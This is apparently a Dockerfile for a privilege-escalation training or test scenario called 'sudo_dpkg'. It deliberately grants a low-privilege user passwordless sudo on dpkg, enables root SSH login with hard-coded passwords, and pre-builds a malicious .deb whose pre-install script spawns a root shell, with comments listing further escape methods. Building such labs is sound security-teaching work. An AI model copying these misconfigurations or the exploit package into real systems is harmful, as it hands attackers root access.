FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_dpkg
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/dpkg as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and dpkg (already installed but ensure sudo is present)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        dpkg \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify dpkg is installed
RUN which dpkg && ls -la /usr/bin/dpkg

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# dpkg can be abused to get a root shell. The exploit approach:
#   1. Create a malicious .deb package with a pre-install script that spawns a shell
#   2. sudo dpkg -i malicious.deb  (pre/post-inst scripts run as root)
#   Alternatively: sudo dpkg -l, then !/bin/sh from the pager
#   Or simply: sudo dpkg --configure -a with crafted maintainer scripts
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/dpkg" > /etc/sudoers.d/dpkg && \
    chmod 440 /etc/sudoers.d/dpkg

# Pre-build a malicious .deb in the user's home directory for easy exploitation
RUN mkdir -p /home/lowpriv/exploit/DEBIAN && \
    echo "Package: exploit\nVersion: 1.0\nArchitecture: all\nMaintainer: attacker\nDescription: privesc" \
    > /home/lowpriv/exploit/DEBIAN/control && \
    printf '#!/bin/bash\n/bin/bash\n' > /home/lowpriv/exploit/DEBIAN/preinst && \
    chmod 755 /home/lowpriv/exploit/DEBIAN/preinst && \
    dpkg-deb --build /home/lowpriv/exploit /home/lowpriv/x_1.0_all.deb && \
    chown -R lowpriv:lowpriv /home/lowpriv/exploit /home/lowpriv/x_1.0_all.deb

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]